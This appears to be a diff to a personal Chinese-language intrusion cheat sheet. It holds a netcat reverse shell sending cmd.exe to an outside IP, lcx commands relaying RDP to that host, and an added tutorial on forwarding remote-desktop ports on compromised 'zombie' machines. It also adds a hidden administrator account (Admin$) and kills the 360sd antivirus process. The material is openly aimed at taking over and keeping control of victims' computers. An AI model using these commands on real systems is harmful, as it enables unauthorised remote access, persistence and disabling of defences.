@@ -1,18 +1,43 @@
+
+
 nc -vv -lp 52
 nc.exe -e cmd.exe 139.199.16.124 52
 
 lcx.exe -listen 51 33891
 lcx.exe -slave 139.199.16.124 51 127.0.0.1 3389
 
+lcx操作实例
+全windows下的操作网上有很多文章教程，这里不再重复。主要演示以下三种： tran功能；linux监听，windows转发；windows监听，linux转发。windows主机地址192.168.91.129，linux主机地址192.168.91.134。
+
+1、 tran功能
+
+tran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信。比如，肉鸡A开启了3389端口，使用tran命令转向到肉鸡A的55端口，那么，我们访问肉鸡A的55端口就可以连接到肉鸡A的远程桌面。又比如，外网机B可以直接访问到肉鸡A的3389端口，我们使用tran将外网机B的3333端口转向到肉鸡A的3389端口，那么，我们通过访问外网机B的3333端口就可以连接到肉鸡A的远程桌面。
+
+(1) 本机端口转向
+命令：lcx -tran 55 127.0.0.1 3389
+
+(2) 转向其他主机端口
+
+命令：lcx -m 1 -p1 3333 -h2 192.168.91.129 -p2 3389
+
+2、linux监听，windows转发
+
+(1) linux监听：./portmap -m 2 -p1 2222 -p2 55
+(2) windows转发：lcx -slave 192.168.91.134 2222  192.168.91.129 3389
+
+3、windows监听，linux转发
+(1) windows监听：lcx -listen  111 55
+(2) linux转发：./portmap -m 3 -h1 192.168.91.134 -p1 22 -h2 192.168.91.129 -p2 111
+来自:https://secvul.com/topics/307.html
+
+
+
 net user Admin$ Aa123456. /add
 net localgroup Administrators Admin$ /add
-
 runas /noprofile /user:Administrator cmd
 
 
-在Windows Server 2003下建立隐藏帐户 : http://leihenzhimu.blog.51cto.com/3217508/758825
-
-
+在Windows Server 2003下建立隐藏帐户 : http://leihenzhimu.blog.51cto.com/3217508/758825  
 
 taskkill /f /t /im  360sd.exe
 
